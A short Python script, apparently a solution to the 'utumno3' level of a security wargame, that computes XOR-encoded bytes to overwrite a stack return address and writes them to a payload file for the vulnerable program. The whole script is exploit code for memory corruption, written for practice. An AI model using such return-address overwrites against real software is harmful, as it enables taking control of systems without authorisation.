#!/usr/bin/python3
writeAddress = 0xffffde2c
dataToWrite = [0x8e, 0xdf, 0xff, 0xff]
ebp = 0xffffde28
ebxChunks = []
fullString = ''

print("Desired Ret Address: " + hex(dataToWrite[3]) + hex(dataToWrite[2])[2:] + hex(dataToWrite[1])[2:] + hex(dataToWrite[0])[2:])
for i in range(0,4):
    ebxChunks.append(hex((writeAddress+0x24-ebp+(i)) ^ (3*i))[2:])
print("")
print("Complete input: 0x", end="")
for i in range(0,4):
    print(ebxChunks[i] + hex(dataToWrite[i] ^ (3*i))[2:], end="")
    fullString += ebxChunks[i] + hex(dataToWrite[i])[2:]
print("\n")
print("Opening testinput..")
inFile = open('./payload', 'wb')
inFile.write(bytes.fromhex(fullString))
print("Wrote to payload file bytes '0x" + fullString +"'")
print("Run utumno3 wrapper c file with payload file redirected in.")
